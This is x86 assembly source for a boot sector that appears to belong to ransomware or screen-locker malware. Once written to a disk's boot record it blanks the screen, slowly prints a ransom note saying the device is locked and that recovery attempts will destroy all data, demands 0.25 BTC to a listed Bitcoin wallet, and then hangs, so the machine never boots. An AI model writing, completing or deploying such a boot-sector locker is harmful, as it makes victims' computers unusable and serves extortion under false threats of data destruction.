org 0x7c00    ; address of this code in memory
bits 16       ; just 16-bit code

; set text mode
mov ah, 0x00
mov al, 0x03
int 0x10

; scroll up the screen
mov ax, 0x0600
mov bh, 0x1f
xor cx, cx
mov dx, 0x184f
int 0x10

; print message
mov bx, message
call print

; infinite loop
jmp $ 

print:
    print_start:
        mov al, byte [bx]

        or al, al
        jz print_ret            

        mov ah, 0x0e
        int 0x10

        inc bx
        
        
        mov dx, 0x4240
        mov cx, 0x01
        mov ah, 0x86
        
        int 0x15
        
        jmp print_start

    print_ret:
        ret

message: db "Your device has been locked.", 0x0a, 0x0d, "Any unauthorized attempt to restore your data will lead to complete", 0x0a, 0x0d, "destruction of all information stored on your PC.", 0x0a, 0x0d, 0x0a, 0x0d, "In order to unlock your device, please, send 0.25 BTC on the listed below", 0x0a, 0x0d, "Bitcoin Wallet:", 0x0a, 0x0d, "1DXKL99n5xszuz7xbkM2jU8y27C5qG1Wet", 0x0a, 0x0d, 0x00

; Fill all space between the code and boot signature with 0x00
times 510 - ($ - $$) db 0x00

; Boot sector signature
dw 0xaa55 
